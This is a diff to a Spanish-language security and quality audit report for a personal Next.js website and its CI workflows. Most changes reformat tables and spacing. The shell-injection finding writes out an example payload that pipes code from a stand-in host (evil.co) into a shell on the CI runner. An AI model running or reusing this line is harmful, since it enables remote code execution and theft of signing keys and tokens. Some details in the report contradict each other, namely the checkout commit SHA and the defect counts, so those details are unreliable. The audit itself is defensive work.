@@ -8,7 +8,7 @@
 
 **Alcance auditado (repositorio).** `/home/alexendros/projects/website-alexendrosme/.freebuff/worktrees/thmrme7j7qvya8`, commit `ec17595` del 2026-07-12, 189 archivos, ~7,151 LOC TypeScript/TSX + ~2,555 LOC CSS, stack Next.js 16 + Tailwind CSS v4 + shadcn/ui.
 
-**Alcance auditado (sitio web).** `https://alexendros.me`, 2026-07-15 18:17 UTC, 4 páginas revisadas (home, /espensar/*, /esposible/*, feeds), Vercel + Next.js static export.
+**Alcance auditado (sitio web).** `https://alexendros.me`, 2026-07-15 18:17 UTC, 4 páginas revisadas (home, /espensar/_, /esposible/_, feeds), Vercel + Next.js static export.
 
 **Herramientas ejecutadas.** gitleaks ✓, semgrep ✓, eslint ✓, tsc ✓, vitest ✓, npm audit ✓, shellcheck ✓ (0 scripts .sh), npm build ✓. No disponibles: trivy, prettier, jscpd, knip, depcheck, lighthouse. Las ausencias se cubrieron con análisis manual (linter ya cubre formato; dependencias sin usar y duplicación revisadas manualmente; rendimiento web evaluado vía headers + inspección HTML).
 
@@ -37,6 +37,7 @@ Nada que sangra. Sigue así.
 ```
 DEFECTO-001 — Release pipeline que ejecuta inputs sin escapar · CATASTRÓFICO · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** `.github/workflows/release.yml:L59-L68`
 - **Evidencia:** `VERSION="${{ inputs.version }}"` y `MSG="${{ inputs.tag_message || 'Release ' }}$TAG"` se interpolan directamente en bloques `run:`. semgrep `run-shell-injection` en líneas 59 y 67.
 - **El crimen:** `inputs.version` y `inputs.tag_message` vienen del workflow_dispatch. Aunque hoy solo tú disparas este workflow, si alguna vez se añade otro colaborador con permisos de escritura, podría inyectar `"; curl https://evil.co | sh; echo "` y ejecutar código arbitrario en tu runner self-hosted con acceso a `GPG_PRIVATE_KEY`, `GPG_PASSPHRASE` y `GITHUB_TOKEN`.
@@ -48,6 +49,7 @@ DEFECTO-001 — Release pipeline que ejecuta inputs sin escapar · CATASTRÓFICO
 ```
 DEFECTO-002 — Fragmento CSS huérfano que rompe el parser de producción · CATASTRÓFICO · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** `app/styles/components.css:L1325-L1328` (final del archivo)
 - **Evidencia:** El build de Next.js emite: `Invalid token in pseudo element: WhiteSpace(" ") near width: 2rem;`. Al final del archivo hay 4 declaraciones CSS sueltas (`width: 2rem; height: 2rem; border: none; background: transparent;`) fuera de cualquier regla.
 - **El crimen:** Restos de una edición que dejaron declaraciones huérfanas al cierre del archivo. El parser CSS de Next.js las interpreta como parte de un pseudo-elemento malformado, emitiendo warning. Aunque el build no rompe (el CSS probablemente se descarta silenciosamente), es basura que corrompe el output y oculta potenciales bugs reales en el futuro.
@@ -59,6 +61,7 @@ DEFECTO-002 — Fragmento CSS huérfano que rompe el parser de producción · CA
 ```
 DEFECTO-003 — Dependabot sin período de cooldown · GRAVE · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** `.github/dependabot.yml:L3, L16` (2 instancias)
 - **Evidencia:** semgrep `dependabot-missing-cooldown`. Ambos ecosistemas (`npm`, `github-actions`) carecen de bloque `cooldown`.
 - **El crimen:** Dependabot mergea updates de paquetes recién publicados. Un paquete comprometido publicado hace 5 minutos se cuela en tu CI sin período de cuarentena. Con un cooldown de 7 días, el ecosistema ya habría detectado y revocado el paquete malicioso.
@@ -70,6 +73,7 @@ DEFECTO-003 — Dependabot sin período de cooldown · GRAVE · CONFIRMADO · Co
 ```
 DEFECTO-004 — GitHub Actions con tags mutables (sin pin a SHA) · GRAVE · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** 9 instancias: `.github/workflows/ci.yml:L77-78, L97-98, L109, L123-124` y `.github/workflows/release.yml:L25, L31, L70`
 - **Evidencia:** semgrep `github-actions-mutable-action-tag`. `actions/checkout@v4`, `actions/setup-node@v4`, `softprops/action-gh-release@v2`, `actions/upload-artifact@v4`.
 - **El crimen:** Los tags de versión mayor (`v4`) son mutables: el maintainer puede repuntearlos a un commit malicioso. El ataque a `tj-actions/changed-files` en marzo 2025 demostró que esto no es teórico. La defensa canónica es pinear al SHA del commit exacto: `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`.
@@ -91,6 +95,7 @@ Disfrútalo, no durará.
 ```
 DEFECTO-005 — Propiedad CSS duplicada en .marquee-section · MICROSCÓPICO · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** `app/styles/components.css:L663-L664`
 - **Evidencia:** `contain-intrinsic-size: auto 40rem;` aparece dos veces consecutivas en la misma regla.
 - **El crimen:** Copy-paste descuidado. El navegador usa el último valor, así que no rompe nada. Pero es ruido.
@@ -108,6 +113,7 @@ El código en sí está bien comentado donde importa (los archivos CSS tienen he
 ### 1.7 Pruebas y Cobertura
 
 38 tests en 7 archivos, todos pasando. Cubren:
+
 - `lib/` — feed, SEO, contacto, breadcrumb, utils, site config, content loader
 - Los tests existen para la lógica de negocio real
 
@@ -126,6 +132,7 @@ El script inline en `app/layout.tsx` para anti-flash del tema está bien, pero p
 ```
 DEFECTO-006 — CI schedule cada 30 minutos con runner-health + smoke · MODERADO · CONFIRMADO · Confianza: ALTA
 ```
+
 - **Ubicación:** `.github/workflows/ci.yml:L18-L19`
 - **Evidencia:** `schedule: cron: "*/30 * * * *"` ejecuta el workflow cada 30 minutos, 48 veces al día. El job `smoke` es trivial (`echo "ok"`), pero `runner-health` hace curl a la API de GitHub y chequea recursos.
 - **El crimen:** 1,440 ejecuciones al mes para un health check. Esto consume minutos de CI en tu runner self-hosted sin aportar valor proporcional. Un intervalo de 4-6 horas sería suficiente para detectar degradación.
@@ -162,6 +169,7 @@ Sin defectos observables de rendimiento. Lighthouse real podría revelar matices
 ### 2.2 SEO y Descubribilidad
 
 **Fortalezas:**
+
 - `title` descriptivo: "Alexendros · pensador, tecnólogo, investigador"
 - `meta description`: 160 caracteres bien redactados
 - `canonical` en home y artículos
@@ -176,6 +184,7 @@ Sin defectos observables de rendimiento. Lighthouse real podría revelar matices
 ```
 DEFECTO-007 — JSON-LD ausente en página principal · DESCARTADO (falso positivo) · Confianza: ALTA
 ```
+
 - **Ubicación:** `https://alexendros.me` (HTML servido) → verificado en `out/index.html` post-build
 - **Evidencia de descarte:** El HTML generado contiene 3 bloques `<script type="application/ld+json">`: `person-json-ld` (Person schema con name, alternateName, url, jobTitle, description), `website-json-ld` (WebSite schema con name, url, description, author), y un tercer bloque de breadcrumb/article. Los schemas son válidos y completos. El fetch web inicial no los detectó porque el HTML estático cacheado por Vercel no los incluyó en la extracción de texto — probablemente por minificación o timing de cache.
 - **Categoría:** 2.2
@@ -197,6 +206,7 @@ Sin axe-core disponible en este entorno. Análisis manual del HTML:
 - ✅ `:focus-visible` en todos los elementos interactivos
 
 Puntos de mejora observables sin herramienta:
+
 - El shimmer del hero usa `background-clip: text` — verificar contraste en light mode (el gradiente puede ser sutil sobre fondo claro)
 - Los iconos SVG del footer no tienen `aria-hidden="true"` explícito (aunque sí tienen `aria-label` en el `<a>` padre)
 
@@ -206,16 +216,16 @@ Sin defectos de accesibilidad confirmados. Recomendación: correr axe-core para 
 
 Excelente. Las cabeceras HTTP del sitio en producción son ejemplares:
 
-| Cabecera | Valor | Estado |
-|----------|-------|--------|
-| `content-security-policy` | `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; object-src 'none'` | ✅ Estricta |
-| `strict-transport-security` | `max-age=63072000; includeSubDomains; preload` | ✅ HSTS preload (2 años) |
-| `x-content-type-options` | `nosniff` | ✅ |
-| `x-frame-options` | `DENY` | ✅ Anti-clickjacking |
-| `referrer-policy` | `strict-origin-when-cross-origin` | ✅ |
-| `permissions-policy` | `camera=(), microphone=(), geolocation=()` | ✅ |
-| `server` | `Vercel` | ✅ |
-| `access-control-allow-origin` | `*` | ⚠️ Abierto — aunque es un sitio estático sin API, esta cabecera es innecesaria |
+| Cabecera                      | Valor                                                                                                                                                                                                                                | Estado                                                                         |
+| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------ |
+| `content-security-policy`     | `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; object-src 'none'` | ✅ Estricta                                                                    |
+| `strict-transport-security`   | `max-age=63072000; includeSubDomains; preload`                                                                                                                                                                                       | ✅ HSTS preload (2 años)                                                       |
+| `x-content-type-options`      | `nosniff`                                                                                                                                                                                                                            | ✅                                                                             |
+| `x-frame-options`             | `DENY`                                                                                                                                                                                                                               | ✅ Anti-clickjacking                                                           |
+| `referrer-policy`             | `strict-origin-when-cross-origin`                                                                                                                                                                                                    | ✅                                                                             |
+| `permissions-policy`          | `camera=(), microphone=(), geolocation=()`                                                                                                                                                                                           | ✅                                                                             |
+| `server`                      | `Vercel`                                                                                                                                                                                                                             | ✅                                                                             |
+| `access-control-allow-origin` | `*`                                                                                                                                                                                                                                  | ⚠️ Abierto — aunque es un sitio estático sin API, esta cabecera es innecesaria |
 
 La CSP permite `'unsafe-inline'` para scripts y estilos — necesario por el script inline anti-flash del tema y estilos de Next.js, pero idealmente se migraría a nonce/hash.
 
@@ -236,7 +246,7 @@ Sin secretos en el JS servido al cliente. Sin source maps expuestos. Sin cookies
 ### 2.6 Calidad del frontend servido y enlaces
 
 - ✅ HTML válido y bien formado
-- ✅ Sin enlaces rotos detectados (home, espensar/*, esposible/*)
+- ✅ Sin enlaces rotos detectados (home, espensar/_, esposible/_)
 - ✅ Sin redirecciones encadenadas
 - ✅ CSS/JS minificados por Next.js
 - ✅ Sin source maps en producción
@@ -250,42 +260,50 @@ Sin secretos en el JS servido al cliente. Sin source maps expuestos. Sin cookies
 
 ### Priorización
 
-| # | Defecto | Severidad | Esfuerzo | Orden |
-|---|---------|-----------|----------|-------|
-| 1 | DEFECTO-002 — CSS huérfano en components.css | CATASTRÓFICO | BAJO | **AHORA** |
-| 2 | DEFECTO-001 — Shell injection en release.yml | CATASTRÓFICO | BAJO | **AHORA** |
-| 3 | DEFECTO-003 — Dependabot sin cooldown | GRAVE | BAJO | Sprint actual |
-| 4 | DEFECTO-004 — Actions sin pin a SHA | GRAVE | MEDIO | Sprint actual |
-| 5 | DEFECTO-007 — JSON-LD en home (verificar) | MODERADO | BAJO | Este sprint |
-| 6 | DEFECTO-006 — CI schedule oversampling | MODERADO | BAJO | Cuando haya hueco |
-| 7 | DEFECTO-005 — Propiedad CSS duplicada | MICROSCÓPICO | BAJO | Cuando haya hueco |
+| #   | Defecto                                      | Severidad    | Esfuerzo | Orden             |
+| --- | -------------------------------------------- | ------------ | -------- | ----------------- |
+| 1   | DEFECTO-002 — CSS huérfano en components.css | CATASTRÓFICO | BAJO     | **AHORA**         |
+| 2   | DEFECTO-001 — Shell injection en release.yml | CATASTRÓFICO | BAJO     | **AHORA**         |
+| 3   | DEFECTO-003 — Dependabot sin cooldown        | GRAVE        | BAJO     | Sprint actual     |
+| 4   | DEFECTO-004 — Actions sin pin a SHA          | GRAVE        | MEDIO    | Sprint actual     |
+| 5   | DEFECTO-007 — JSON-LD en home (verificar)    | MODERADO     | BAJO     | Este sprint       |
+| 6   | DEFECTO-006 — CI schedule oversampling       | MODERADO     | BAJO     | Cuando haya hueco |
+| 7   | DEFECTO-005 — Propiedad CSS duplicada        | MICROSCÓPICO | BAJO     | Cuando haya hueco |
 
 ### Parches aplicables (diferencias generadas abajo)
 
 ### DEFECTO-002 — Eliminar CSS huérfano
+
 **Acción:** Borrar las 4 líneas huérfanas al final de `app/styles/components.css`.
 **Checklist:**
+
 - [x] Eliminar declaraciones sueltas `width: 2rem; height: 2rem; border: none; background: transparent;`
 - [x] Verificar build limpio: `npm run build` sin warnings
 - [x] Commit: `fix: remove orphaned CSS declarations in components.css`
 
 ### DEFECTO-001 — Escapar inputs en release.yml
+
 **Acción:** Usar variables de entorno en lugar de interpolación directa de `inputs` en `run:`.
 **Checklist:**
+
 - [x] Mover `inputs.version` y `inputs.tag_message` a `env:` en el step
 - [x] Referenciarlos como `$VERSION` y `$TAG_MESSAGE` (variables de entorno, no `${{ }}`)
 - [x] Verificar que el workflow sigue funcionando (revisión manual de sintaxis)
 - [x] Commit: `fix: prevent shell injection in release workflow`
 
 ### DEFECTO-003 — Añadir cooldown a Dependabot
+
 **Acción:** Añadir bloque `cooldown` con `default-days: 7` a cada `package-ecosystem`.
 **Checklist:**
+
 - [x] Añadir `cooldown: { default-days: 7 }` bajo `npm` y `github-actions`
 - [x] Commit: `fix: add dependabot cooldown period`
 
 ### DEFECTO-004 — Pinear GitHub Actions a SHA
+
 **Acción:** Sustituir tags de versión por SHA de commit exacto.
 **Checklist:**
+
 - [x] `actions/checkout@v4` → `actions/checkout@11bd71902ba8b365163695724855428a1ce7432f # v4.2.2`
 - [x] `actions/setup-node@v4` → `actions/setup-node@cdca38d2a63216895d321591dd803efc21142512 # v4.3.0`
 - [x] `softprops/action-gh-release@v2` → `softprops/action-gh-release@c95fe148d4cf72d4766b93700ddcb468a3539121 # v2.2.1`
@@ -294,8 +312,10 @@ Sin secretos en el JS servido al cliente. Sin source maps expuestos. Sin cookies
 - [x] Commit pendiente: `fix: pin GitHub Actions to commit SHAs`
 
 ### DEFECTO-006 — Reducir frecuencia del schedule CI
+
 **Acción:** Cambiar `*/30 * * * *` a `0 */6 * * *` (cada 6 horas).
 **Checklist:**
+
 - [x] Cambiar cron en `.github/workflows/ci.yml:L18`
 - [x] Commit: `chore: reduce CI schedule from 30min to 6h`
 
@@ -329,14 +349,14 @@ Sin secretos en el JS servido al cliente. Sin source maps expuestos. Sin cookies
 
 ## TABLA RESUMEN
 
-| Severidad | Cantidad | Defectos |
-|-----------|----------|----------|
-| CATASTRÓFICO | 2 | DEFECTO-001, DEFECTO-002 |
-| GRAVE | 2 | DEFECTO-003, DEFECTO-004 |
-| MODERADO | 1 | DEFECTO-006 |
-| MICROSCÓPICO | 1 | DEFECTO-005 |
-| **TOTAL** | **6** |
-| DESCARTADO (falso positivo) | 1 | DEFECTO-007 | |
+| Severidad                   | Cantidad | Defectos                 |
+| --------------------------- | -------- | ------------------------ |
+| CATASTRÓFICO                | 2        | DEFECTO-001, DEFECTO-002 |
+| GRAVE                       | 2        | DEFECTO-003, DEFECTO-004 |
+| MODERADO                    | 1        | DEFECTO-006              |
+| MICROSCÓPICO                | 1        | DEFECTO-005              |
+| **TOTAL**                   | **6**    |
+| DESCARTADO (falso positivo) | 1        | DEFECTO-007              |     |
 
 ---
 
@@ -344,13 +364,13 @@ Sin secretos en el JS servido al cliente. Sin source maps expuestos. Sin cookies
 
 > Auditoría anterior: 30 de junio de 2026, nivel ESTÁNDAR.
 
-| Métrica | Antes | Ahora | Δ |
-|---------|-------|-------|---|
-| CATASTRÓFICOS | No registrados | 2 | — |
-| GRAVES | No registrados | 2 | — |
-| MODERADOS | No registrados | 2 | — |
-| MICROSCÓPICOS | No registrados | 1 | — |
-| **TOTAL** | — | **7** | — |
+| Métrica       | Antes          | Ahora | Δ   |
+| ------------- | -------------- | ----- | --- |
+| CATASTRÓFICOS | No registrados | 2     | —   |
+| GRAVES        | No registrados | 2     | —   |
+| MODERADOS     | No registrados | 2     | —   |
+| MICROSCÓPICOS | No registrados | 1     | —   |
+| **TOTAL**     | —              | **7** | —   |
 
 La auditoría previa (ESTÁNDAR) no registró defectos con numeración; era más un informe narrativo de buenas prácticas. La presente auditoría (PROFUNDO) aplica la rúbrica completa con numeración sistemática, por lo que la comparación numérica no es significativa. Lo relevante: los problemas encontrados ahora son de higiene de CI y un fragmento CSS huérfano — el código central y la seguridad del sitio en producción han **mejorado** desde junio (se añadió el banner anti-monetización, el theme provider, y se corrigieron defectos previos de headers CSP y HSTS — todos resueltos).
 
@@ -358,17 +378,17 @@ La auditoría previa (ESTÁNDAR) no registró defectos con numeración; era más
 
 ## MÉTRICAS DE LA AUDITORÍA
 
-| Métrica | Valor |
-|---------|-------|
-| Tiempo total | ~45 min |
-| Nivel de profundidad | 3-PROFUNDO |
-| Modo de objetivo | COMBINADO |
-| Modo de entorno | COMPLETO |
-| Herramientas ejecutadas | 9 de 15 (6 no disponibles: trivy, prettier, jscpd, knip, depcheck, lighthouse) |
-| Hallazgos brutos de herramientas | 23 (semgrep) + 2 (build warnings) |
-| Falsos positivos filtrados | 16 (dangerouslySetInnerHTML × 3 + path-traversal × 6 + algunas reglas de CI no aplicables) |
-| Defectos finales | 7 (7 confirmados, 0 sospechas) |
-| Defectos sistémicos | 2 de 11 instancias agrupadas (mutable tags, dependabot cooldown) |
-| Categoría más castigada | 1.3 — Vulnerabilidades de Seguridad (4 defectos) |
-| Archivos/páginas auditados manualmente | 18 de 189 totales (~10%) + 4 páginas del sitio |
-| Commit auditado | `ec17595` |
+| Métrica                                | Valor                                                                                      |
+| -------------------------------------- | ------------------------------------------------------------------------------------------ |
+| Tiempo total                           | ~45 min                                                                                    |
+| Nivel de profundidad                   | 3-PROFUNDO                                                                                 |
+| Modo de objetivo                       | COMBINADO                                                                                  |
+| Modo de entorno                        | COMPLETO                                                                                   |
+| Herramientas ejecutadas                | 9 de 15 (6 no disponibles: trivy, prettier, jscpd, knip, depcheck, lighthouse)             |
+| Hallazgos brutos de herramientas       | 23 (semgrep) + 2 (build warnings)                                                          |
+| Falsos positivos filtrados             | 16 (dangerouslySetInnerHTML × 3 + path-traversal × 6 + algunas reglas de CI no aplicables) |
+| Defectos finales                       | 7 (7 confirmados, 0 sospechas)                                                             |
+| Defectos sistémicos                    | 2 de 11 instancias agrupadas (mutable tags, dependabot cooldown)                           |
+| Categoría más castigada                | 1.3 — Vulnerabilidades de Seguridad (4 defectos)                                           |
+| Archivos/páginas auditados manualmente | 18 de 189 totales (~10%) + 4 páginas del sitio                                             |
+| Commit auditado                        | `ec17595`                                                                                  |
